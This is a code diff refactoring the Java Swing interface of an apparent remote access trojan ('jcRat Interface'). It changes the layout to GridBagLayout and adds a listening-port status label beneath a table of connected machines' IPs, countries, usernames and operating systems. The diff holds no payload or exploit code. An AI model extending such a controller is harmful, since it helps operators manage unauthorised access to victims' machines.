@@ -10,6 +10,7 @@ import com.formdev.flatlaf.FlatDarkLaf;
 
 
 import javax.swing.*;
+import javax.swing.border.EmptyBorder;
 import javax.swing.table.DefaultTableCellRenderer;
 import javax.swing.table.DefaultTableModel;
 import java.awt.*;
@@ -17,15 +18,18 @@ import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
 
 
-public class JsGUI {
+public class SplinterGUI {
 
     private final String[] column = {"IP", "Country", "Tag", "Username", "Operating System", "Status"};
-    private JPanel panel;
+    private JPanel mainPanel;
     private JTable connectionsTable;
     private JFrame mainGUI;
 
+    private final JLabel listeningPort = new JLabel();
 
-    public JsGUI() {
+    private final GridBagConstraints gridBagConstraints = new GridBagConstraints();
+
+    public SplinterGUI() {
         loadStyle();
         setUpFrame();
         addComps();
@@ -35,7 +39,6 @@ public class JsGUI {
     private void setUpFrame() {
         mainGUI = new JFrame("jcRat Interface");
         mainGUI.setSize(new Dimension(800, 400));
-        mainGUI.setResizable(false);
         mainGUI.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
         mainGUI.setLocationRelativeTo(null);
 
@@ -72,9 +75,9 @@ public class JsGUI {
         mainGUI.setJMenuBar(menuBar);
     }
 
-    private void addJPanel(){
-        panel = new JPanel();
-        panel.setLayout(null);
+    private void addJPanel() {
+        mainPanel = new JPanel();
+        mainPanel.setLayout(new GridBagLayout());
     }
 
     private void addComps() {
@@ -94,19 +97,49 @@ public class JsGUI {
 
 
     private void addTable() {
+        gridBagConstraints.gridx = 0;
+        gridBagConstraints.gridy = 0;
+        gridBagConstraints.gridwidth = 1;
+        gridBagConstraints.gridheight = 1;
+        gridBagConstraints.weightx = 1.0;
+        gridBagConstraints.weighty = 1.0;
+        gridBagConstraints.fill = GridBagConstraints.BOTH;
         TableModel tableModel = new TableModel(column);
         connectionsTable = new JTable(tableModel);
         JScrollPane tableScroll = new JScrollPane(connectionsTable);
         connectionsTable.setFocusable(false);
-        tableScroll.setBounds(0, 0, 784, 780);
         connectionsTable.addMouseListener(new TablePopUpListener(this));
-        panel.add(tableScroll);
-        mainGUI.add(panel);
+        mainPanel.add(tableScroll, gridBagConstraints);
+        mainGUI.add(mainPanel);
+    }
+
+    private void addBottomPanel() {
+        gridBagConstraints.gridx = 0;
+        gridBagConstraints.gridy = 4;
+        gridBagConstraints.gridwidth = 1;
+        gridBagConstraints.gridheight = 1;
+        gridBagConstraints.weightx = 1.0;
+        gridBagConstraints.weighty = 0.02;
+        gridBagConstraints.fill = GridBagConstraints.HORIZONTAL;
+
+        JPanel bottomInformationPanel = new JPanel();
+        bottomInformationPanel.setLayout(new BorderLayout());
+
+        ServerGUI.changeColorAndStateOfPortInformation(listeningPort);
+        listeningPort.setForeground(new Color(135, 135, 135));
+
+        listeningPort.setBorder(new EmptyBorder(1, 4, 1, 8));
+
+        bottomInformationPanel.add(listeningPort, BorderLayout.LINE_END);
+        mainPanel.add(bottomInformationPanel, gridBagConstraints);
+
+
     }
 
     private void setupTable() {
         addTable();
         styleTable();
+        addBottomPanel();
     }
 
     private void styleTable() {
@@ -138,5 +171,7 @@ public class JsGUI {
         return (DefaultTableModel) connectionsTable.getModel();
     }
 
-
+    public JLabel getListeningPort() {
+        return listeningPort;
+    }
 }
